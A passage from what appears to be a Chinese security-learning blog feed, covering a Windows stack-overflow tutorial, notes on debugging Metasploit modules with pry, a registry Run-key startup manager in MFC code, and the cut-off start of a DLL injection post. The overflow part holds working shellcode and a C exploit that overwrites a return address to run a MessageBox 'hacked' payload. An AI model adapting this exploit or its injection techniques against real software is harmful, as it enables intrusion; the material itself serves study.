&quot;\x68\x20\x62\x79\x20&quot;</span><br><span class="line">  &quot;\x68\x63\x6B\x65\x64&quot;</span><br><span class="line">  &quot;\x68\x6E\x20\x68\x61&quot;</span><br><span class="line">  &quot;\x68\x20\x62\x65\x65&quot;</span><br><span class="line">  &quot;\x68\x68\x61\x76\x65&quot;</span><br><span class="line">  &quot;\x68\x79\x6F\x75\x20&quot;</span><br><span class="line">  &quot;\x8B\xCC&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\x50&quot;</span><br><span class="line">  &quot;\x51&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\xB8\x99\xEA\xF0\x75&quot;</span><br><span class="line">  &quot;\xFF\xD0&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\xB8\x52\xBE\xC0\x76&quot;</span><br><span class="line">  &quot;\xFF\xD0&quot;;</span><br></pre></td></tr></table></figure></p><h4 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;windows.h&quot;</span><br><span class="line">#include &quot;stdio.h&quot;</span><br><span class="line">#include &quot;string.h&quot;</span><br><span class="line"></span><br><span class="line">char name[] = &quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot;</span><br><span class="line">              &quot;\x41\x41\x41\x41&quot;   //ebp</span><br><span class="line">  &quot;\xb3\xa0\xf6\x75&quot;   //Return address \xb3\xa0\x20\x76</span><br><span class="line">  &quot;\x83\xEC\x50&quot;</span><br><span class="line">  &quot;\x33\xDB&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\x68\x69\x6E\x67\x20&quot;</span><br><span class="line">  &quot;\x68\x57\x61\x72\x6E&quot;</span><br><span class="line">  &quot;\x8B\xC4&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\x68\x21\x20\x20\x20&quot;</span><br><span class="line">  &quot;\x68\x4D\x30\x72\x6B&quot;</span><br><span class="line">  &quot;\x68\x20\x62\x79\x20&quot;</span><br><span class="line">  &quot;\x68\x63\x6B\x65\x64&quot;</span><br><span class="line">  &quot;\x68\x6E\x20\x68\x61&quot;</span><br><span class="line">  &quot;\x68\x20\x62\x65\x65&quot;</span><br><span class="line">  &quot;\x68\x68\x61\x76\x65&quot;</span><br><span class="line">  &quot;\x68\x79\x6F\x75\x20&quot;</span><br><span class="line">  &quot;\x8B\xCC&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\x50&quot;</span><br><span class="line">  &quot;\x51&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\xB8\x99\xEA\xF0\x75&quot;</span><br><span class="line">  &quot;\xFF\xD0&quot;</span><br><span class="line">  &quot;\x53&quot;</span><br><span class="line">  &quot;\xB8\x52\xBE\xC0\x76&quot;</span><br><span class="line">  &quot;\xFF\xD0&quot;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char buffer[8];</span><br><span class="line">LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">strcpy(buffer,name);</span><br><span class="line">printf(&quot;%s\n&quot;,buffer);</span><br><span class="line">getchar();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2017/08/02/windows栈溢出入门/1.png" alt=""></p><h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><ul><li><a href="http://bbs.pediy.com/search-_E5_8E_9F_E5_88_9B_5DOllyDBG_20_E5_85_A5_E9_97_A8_E7_B3_BB_E5_88_97.htm" target="_blank" rel="noopener">OllyDBG 入门系列</a><br><a href="http://blog.csdn.net/niexinming/article/details/78144301" target="_blank" rel="noopener">覆盖虚表方式利用栈溢出漏洞</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li><li><a href="https://www.youtube.com/watch?v=aEZKGW_VTd4" target="_blank" rel="noopener">Hacker Course Buffer Overflow - A Practical Example</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>metasploit调试以及ruby入门踩坑</title>
      <link href="/2017/07/26/metasploit%E8%B0%83%E8%AF%95/"/>
      <url>/2017/07/26/metasploit%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<p>记录下踩的坑吧</p><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Ruby是什么，gem又是什么，Ruby on Rails又是什么，之前只是知道Ruby是一门面向对象的脚本语言，gem是有一个ruby的包管理器，好比是python的pip以及nodejs的NPM，而Ruby on Rails是一个使用Ruby语言写的开源Web应用框架，它是严格按照MVC结构开发的。它努力使自身保持简单，来使实际的应用开发时的代码更少，使用最少的配置。(据说Twitter就是用的这个框架)</p><h4 id="Gem使用"><a href="#Gem使用" class="headerlink" title="Gem使用"></a>Gem使用</h4><p>Gem 是一个管理 Ruby 库和程序的标准包。Ruby gem 包的安装方式：<br>所有的 gem 包，会被安装到 /[Ruby root]/lib/ruby/gems/[ver]/ 目录下，这其中包括了 Cache、doc、gems、specifications 等目录，cache 下放置下载的原生 gem 包，gems 下则放置的是解压过的 gem 包。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> M0rk@hhh  ~/.rvm/rubies/ruby-2.3.0/lib/ruby/gems/2.3.0  ls</span><br><span class="line">bin            build_info     cache          doc            environment    extensions     gems           specifications wrappers</span><br></pre></td></tr></table></figure></p><p>当安装过程中遇到问题时，可以进入这些目录，手动删除有问题的 gem 包，然后重新运行 gem install [gemname] 命令即可。<br>Ruby Gem 命令详解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 更新Gem自身</span><br><span class="line"># 注意：在某些linux发行版中为了系统稳定性此命令禁止执行</span><br><span class="line">$ gem update --system</span><br><span class="line"></span><br><span class="line"># 从Gem源安装gem包</span><br><span class="line">$ gem install [gemname]</span><br><span class="line"></span><br><span class="line"># 从本机安装gem包</span><br><span class="line">$ gem install -l [gemname].gem</span><br><span class="line"></span><br><span class="line"># 安装指定版本的gem包</span><br><span class="line">$ gem install [gemname] --version=[ver]</span><br><span class="line"></span><br><span class="line"># 更新所有已安装的gem包</span><br><span class="line">$ gem update</span><br><span class="line"></span><br><span class="line"># 更新指定的gem包</span><br><span class="line"># 注意：gem update [gemname]不会升级旧版本的包，此时你可以使用 gem install [gemname] --version=[ver]代替</span><br><span class="line">$ gem update [gemname]</span><br><span class="line"></span><br><span class="line"># 删除指定的gem包，注意此命令将删除所有已安装的版本</span><br><span class="line">$ gem uninstall [gemname]</span><br><span class="line"></span><br><span class="line"># 删除某指定版本gem</span><br><span class="line">$ gem uninstall [gemname] --version=[ver]</span><br><span class="line"></span><br><span class="line"># 查看本机已安装的所有gem包</span><br><span class="line">$ gem list [--local]</span><br></pre></td></tr></table></figure><h4 id="踩坑开始"><a href="#踩坑开始" class="headerlink" title="踩坑开始"></a>踩坑开始</h4><p>开始的时候看的是这篇文章<br><a href="https://community.rapid7.com/community/metasploit/blog/2014/03/14/debugging-metasploit-modules-with-pry-debugger" target="_blank" rel="noopener">https://community.rapid7.com/community/metasploit/blog/2014/03/14/debugging-metasploit-modules-with-pry-debugger</a><br>但是在安装的时候报错，没有好的解决方法<br>这个时候我发现了这个<br><a href="https://github.com/deivid-rodriguez/byebug" target="_blank" rel="noopener">https://github.com/deivid-rodriguez/byebug</a><br>感觉应该是相同用途，安装没报错，然后修改rb的时候一直加载不了，这个时候想到自己有安装RubyMine，那就测试个helloworld试试看。测试的没问题，如下图：<br><img src="/2017/07/26/metasploit调试/1.png" alt=""><br>后来发现，当添加或者修改metasploit的modules的时候，需要使用 reload_all 命令来重新加载所有的模块，但是添加了 require ‘byebug’ 时候还是报错，好像是需要rerun bundle的，rerun的时候又是各种问题，首先ruby版本太低，升级完ruby版本，bundle install的时候没错了，但是运行msfconsole还是失败…完，meatsloit弄坏了，晚上回来， /opt/metasploit-framework/embedded/framework  sudo ./msfupdate 升级了一下又能用了，太晚了，明天再看看吧</p><p>0727更新：<br>今天又看了下资料，发现byebug还是不能用，搜索metasploit debug的资料也是很老的，但是在Stack Overflow发现了这个<a href="https://stackoverflow.com/questions/43882397/debugging-about-the-metasploit-exploit-module" target="_blank" rel="noopener">https://stackoverflow.com/questions/43882397/debugging-about-the-metasploit-exploit-module</a><br>就试了一下pry，果然可以和metasploit无缝使用。但是蛋疼的是pry没有step和next这种最基本的单步调试功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require ‘pry’ #需要pry库,否则binding.pry就不认识了</span><br><span class="line">g_a = 1</span><br><span class="line">g_b = 2</span><br><span class="line">binding.pry #运行到这句程序就停下来并打开pry让你调试</span><br></pre></td></tr></table></figure></p><p>随便找个msf的rb脚本，插上上面的代码<br><img src="/2017/07/26/metasploit调试/2.png" alt=""></p><p>pry常用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd: 这可不是切换目录的，而是切换类。如”cd Article”会进入Article类中，”Article.all”可直接缩写为”all”</span><br><span class="line">nesting: cd切来切去如果迷了路，用它可以看当前在哪个类下面。我倒觉得如果名字改为”pwd”会更好。</span><br><span class="line">ls: 查看一些信息，ls -h查看帮助，ls -m查看实例方法，ls -M查看类方法，ls -p查看private方法。</span><br><span class="line">show-doc Array#in_groups_of：查看文档。</span><br><span class="line">show-method -l Array#in_groups_of：查看方法的源代码，-l显示行号。</span><br><span class="line">edit-method Array#in_groups_of：调出nano来编辑代码，如果是能调出vim就好啦。(后来发现其实很简单，见后面。)</span><br><span class="line">help：显示帮助</span><br></pre></td></tr></table></figure><p>rvm 常用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RVM是Ruby Version Manager的缩写，是一个命令行工具，它可以让你轻松地安装，管理和使用多个版本的Ruby.不同的rails项目使用等ruby和rails版本不一样的时候，可以使用RVM自由切换。</span><br><span class="line">1.rvm list 查看所有的ruby版本</span><br><span class="line">2.rvm current 查看当前的ruby版本</span><br><span class="line">3.rvm --default use 2.x.x  切换到到版本2.x.xs</span><br></pre></td></tr></table></figure></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>1.pry-debugger在ruby2.0+已不再能使用，所以基本上可以放弃<br>2.pry-byebug 应该是现在在用的，但是我这里bundle install完之后，msfconsole就报错了，暂时问题还没解决，感觉应该是metasploit使用了自带的ruby以及gem的问题<br>3.最终还是选择了没有单步步过功能的pry<br>4.其实python也有这种调试工具，是pdb的模块，感兴趣的可以学习下<br>5.msfconsole居然是一个脚本文件，一开始以为是个二进制程序。。。（当你通过whereis找不到这个文件的时候，就很有可能是个文本文件，find找到，然后file命令看一下）<br>6.metasploit的ruby是自带的，可执行文件在这个目录下 /opt/metasploit-framework/embedded/bin</p><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ol><li><a href="http://blog.csdn.net/nixawk/article/details/43732835" target="_blank" rel="noopener">metasploit - debug</a></li><li><a href="http://shashanzhao.com/archives/877.html" target="_blank" rel="noopener">使用pry调试程序介绍</a></li><li><a href="https://github.com/pry/pry" target="_blank" rel="noopener">pry</a></li><li><a href="http://www.jianshu.com/p/602db03b6b58" target="_blank" rel="noopener">如何单步调试ruby代码</a></li><li><a href="http://drops.xmd5.com/static/drops/tips-14408.html" target="_blank" rel="noopener">乌云文章：Metasploit module开发入门篇</a></li></ol>]]></content>
      
      
    </entry>
    
    <entry>
      <title>windows注册表</title>
      <link href="/2017/07/24/windows%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
      <url>/2017/07/24/windows%E6%B3%A8%E5%86%8C%E8%A1%A8/</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;注册表是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候，注册表就已经出现。随后推出的Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是，从Windows 95开始，注册表才真正成为Windows用户经常接触的内容，并在其后的操作系统中继续沿用至今。<br>由于注册表的功能非常强大，因此注册表对于病毒、木马来说是非常有利用价值的，而对于反病毒软件来说，注册表也是它需要加强守卫的地方，可以说，注册表是一个正义与邪恶的必争之地。<br>恶意程序在注册表中常见的操作有修改文件关联、增加系统启动项、映像劫持、篡改浏览器主页等。<br><strong>数据结构</strong>:<br>&nbsp;&nbsp;&nbsp;&nbsp;注册表由键（key，或称“项”）、子键（subkey，子项）和值项（value）构成。一个键就是树状数据结构中的一个节点，而子键就是这个节点的子节点，子键也是键。一个值项则是一个键的一条属性，由名称（name）、数据类型（datatype）以及数据（data）组成。一个键可以有一个或多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该键的默认值。<br><strong>数据类型</strong>:<br>注册表的数据类型主要有以下五种：</p><table><thead><tr><th>显示类型</th><th>数据类型</th><th>说明</th></tr></thead><tbody><tr><td>REG_SZ</td><td>字符串</td><td>文本字串</td></tr><tr><td>REG_BINARY</td><td>二进制数</td><td>不定长度的二进制值，以十六进制显示</td></tr><tr><td>REG_DWORD</td><td>双字</td><td>一个 32 位的二进制值，显示为 8 位的十六进制值</td></tr><tr><td>REG_MULTI_SZ</td><td>多字符串</td><td>含有多个文本值的字符串，此名来源于字符串间用 nul 分隔、结尾两个 nul</td></tr><tr><td>REG_EXPAND_SZ</td><td>可扩充字符串</td><td>含有环境变量的字符串</td></tr></tbody></table><p><strong>注册表的分支结构</strong>:<br>注册表有五个一级分支，下面是这五个分支的名称及作用：</p><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>HKEY_CLASSES_ROOT</td><td>存储Windows可识别的文件类型的详细列表，以及相关联的程序。</td></tr><tr><td>HKEY_CURRENT_USER</td><td>存储当前用户设置的信息。</td></tr><tr><td>HKEY_LOCAL_MACHINE</td><td>包括安装在计算机上的硬件和软件的信息。</td></tr><tr><td>HKEY_USERS</td><td>包含使用计算机的用户的信息。</td></tr><tr><td>HKEY_CURRENT_CONFIG</td><td>这个分支包含计算机当前的硬件配置信息。</td></tr></tbody></table><h4 id="通过注册表获取开机启动项"><a href="#通过注册表获取开机启动项" class="headerlink" title="通过注册表获取开机启动项"></a>通过注册表获取开机启动项</h4><p>原理: 通过枚举注册表中的 “HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\“子键下的键值项,取得跟随windows启动而启动的程序。</p><p>主要代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">VOID CManageRunDlg::InitRunList()</span><br><span class="line">&#123;</span><br><span class="line">    // 设置扩展样式</span><br><span class="line">    m_RunList.SetExtendedStyle(</span><br><span class="line">            m_RunList.GetExtendedStyle()</span><br><span class="line">            | LVS_EX_GRIDLINES          // 有网格</span><br><span class="line">            | LVS_EX_FULLROWSELECT);    // 选择单行</span><br><span class="line"></span><br><span class="line">    // 在ListCtrl中插入新列</span><br><span class="line">    m_RunList.InsertColumn(0, &quot;NO.&quot;);</span><br><span class="line">    m_RunList.InsertColumn(1, &quot;键值名称&quot;);</span><br><span class="line">    m_RunList.InsertColumn(2, &quot;键    值&quot;);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    LVSCW_AUTOSIZE_USEHEADER:</span><br><span class="line">    列的宽度自动匹配为标题文本</span><br><span class="line">    如果这个值用在最后一列，列宽被设置为ListCtrl剩余的长度</span><br><span class="line">    */</span><br><span class="line">    m_RunList.SetColumnWidth(0, LVSCW_AUTOSIZE_USEHEADER);</span><br><span class="line">    m_RunList.SetColumnWidth(1, LVSCW_AUTOSIZE_USEHEADER);</span><br><span class="line">    m_RunList.SetColumnWidth(2, LVSCW_AUTOSIZE_USEHEADER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#define REG_RUN &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run\\&quot;</span><br><span class="line"></span><br><span class="line">VOID CManageRunDlg::ShowRunList()</span><br><span class="line">&#123;</span><br><span class="line">    // 清空ListCtrl中的所有项</span><br><span class="line">    m_RunList.DeleteAllItems();    </span><br><span class="line"></span><br><span class="line">    DWORD dwType = 0;</span><br><span class="line">    DWORD dwBufferSize = MAXBYTE;</span><br><span class="line">    DWORD dwKeySize = MAXBYTE;</span><br><span class="line">    char szValueName[MAXBYTE] = &#123; 0 &#125;;</span><br><span class="line">    char szValueKey[MAXBYTE] = &#123; 0 &#125;;</span><br><span class="line"></span><br><span class="line">    HKEY hKey = NULL;</span><br><span class="line">    LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, </span><br><span class="line">            REG_RUN, 0, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class="line"></span><br><span class="line">    if ( lRet != ERROR_SUCCESS )</span><br><span class="line">    &#123;</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int i = 0;</span><br><span class="line">    CString strTmp;</span><br><span class="line"></span><br><span class="line">    while ( TRUE )</span><br><span class="line">    &#123;</span><br><span class="line">        // 枚举键项</span><br><span class="line">        lRet = RegEnumValue(hKey, i, szValueName, </span><br><span class="line">            &amp;dwBufferSize, NULL, &amp;dwType, </span><br><span class="line">            (unsigned char *)szValueKey, &amp;dwKeySize);</span><br><span class="line"></span><br><span class="line">        // 没有则退出循环</span><br><span class="line">        if ( lRet == ERROR_NO_MORE_ITEMS )</span><br><span class="line">        &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 显示到列表控件中</span><br><span class="line">        strTmp.Format(&quot;%d&quot;, i);</span><br><span class="line">        m_RunList.InsertItem(i, strTmp);</span><br><span class="line">        m_RunList.SetItemText(i, 1, szValueName);</span><br><span class="line">        m_RunList.SetItemText(i, 2, szValueKey);</span><br><span class="line"></span><br><span class="line">        ZeroMemory(szValueKey, MAXBYTE);</span><br><span class="line">        ZeroMemory(szValueName, MAXBYTE);</span><br><span class="line"></span><br><span class="line">        dwBufferSize = MAXBYTE;</span><br><span class="line">        dwKeySize = MAXBYTE;</span><br><span class="line"></span><br><span class="line">        i ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RegCloseKey(hKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void CManageRunDlg::OnBtnAdd() </span><br><span class="line">&#123;</span><br><span class="line">// TODO: Add your control notification handler code here</span><br><span class="line">CRegAdd RegAdd;</span><br><span class="line">    RegAdd.DoModal();</span><br><span class="line"></span><br><span class="line">    // 判断输入是否完整</span><br><span class="line">    if ( strlen(RegAdd.m_szKeyName) &gt; 0 &amp;&amp; </span><br><span class="line">        strlen(RegAdd.m_szKeyValue) &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        HKEY hKey = NULL;</span><br><span class="line">        LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, </span><br><span class="line">            REG_RUN, 0, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class="line"></span><br><span class="line">        if ( lRet != ERROR_SUCCESS )</span><br><span class="line">        &#123;</span><br><span class="line">            return ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        RegSetValueEx(hKey, RegAdd.m_szKeyName, 0, </span><br><span class="line">            REG_SZ, (const unsigned char*)RegAdd.m_szKeyValue,</span><br><span class="line">            strlen(RegAdd.m_szKeyValue) + sizeof(char));</span><br><span class="line"></span><br><span class="line">        RegCloseKey(hKey);</span><br><span class="line"></span><br><span class="line">        ShowRunList();</span><br><span class="line">    &#125; </span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        AfxMessageBox(&quot;请输入完整的内容&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void CManageRunDlg::OnBtnDel() </span><br><span class="line">&#123;</span><br><span class="line">    // TODO: Add your control notification handler code here</span><br><span class="line">    POSITION pos = m_RunList.GetFirstSelectedItemPosition();</span><br><span class="line">    int nSelected = -1;</span><br><span class="line">    </span><br><span class="line">    while ( pos )</span><br><span class="line">    &#123;</span><br><span class="line">        nSelected = m_RunList.GetNextSelectedItem(pos);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ( -1 == nSelected )</span><br><span class="line">    &#123;</span><br><span class="line">        AfxMessageBox(&quot;请选择要删除的启动项&quot;);</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    char szKeyName[MAXBYTE] = &#123; 0 &#125;;</span><br><span class="line">    m_RunList.GetItemText(nSelected, 1, szKeyName, MAXBYTE);</span><br><span class="line">        </span><br><span class="line">    HKEY hKey = NULL;</span><br><span class="line">    </span><br><span class="line">    LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, </span><br><span class="line">            REG_RUN, 0, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class="line">    </span><br><span class="line">    RegDeleteValue(hKey, szKeyName);</span><br><span class="line">    </span><br><span class="line">    RegCloseKey(hKey);</span><br><span class="line">    </span><br><span class="line">    ShowRunList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2017/07/24/windows注册表/1.png" alt=""></p><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul><li>注册表 <a href="https://www.wikiwand.com/zh-hans/%E6%B3%A8%E5%86%8C%E8%A1%A8" target="_blank" rel="noopener">https://www.wikiwand.com/zh-hans/%E6%B3%A8%E5%86%8C%E8%A1%A8</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>DLL注入</title>
      <link href="/2017/07/16/windows%20DLL%E6%B3%A8%E5%85%A5/"/>
      <url>/2017/07/16/windows%20DLL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><h4 id="DLL远程注入"><a href="#DLL远程注入" class="headerlink" title="DLL远程注入"></a>DLL远程注入</h4><p>dll的注入和卸载<br><img src="/2017/07/16/windows DLL注入/1.png" alt=""><br>关键性代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 